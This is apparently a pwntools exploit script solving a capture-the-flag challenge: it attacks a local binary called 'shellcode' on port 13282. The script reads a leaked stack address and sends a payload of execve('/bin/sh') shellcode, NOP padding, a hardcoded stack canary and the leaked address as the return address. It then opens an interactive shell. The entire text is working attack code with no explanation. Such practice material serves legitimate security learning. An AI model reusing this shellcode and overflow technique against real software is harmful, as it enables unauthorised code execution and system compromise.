from pwn import *

# context.log_level = "debug"

binary = "./shellcode"
e = ELF(binary)
libc = e.libc
# r = process(binary)
r = remote("localhost", 13282)

r.recvuntil(b"Address of RBP - 0x60 (Buffer): 0x")
stack = int(r.recv(12), 16)
canary = 0xdeadbeefcafebabe
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
log.info("stack : " + hex(stack))

payload = b""
payload += shellcode
payload += b"\x90" * (0x58 - len(shellcode))
payload += p64(canary)
payload += b"A" * 0x8
payload += p64(stack)
r.sendafter("Input : ", payload)

r.interactive()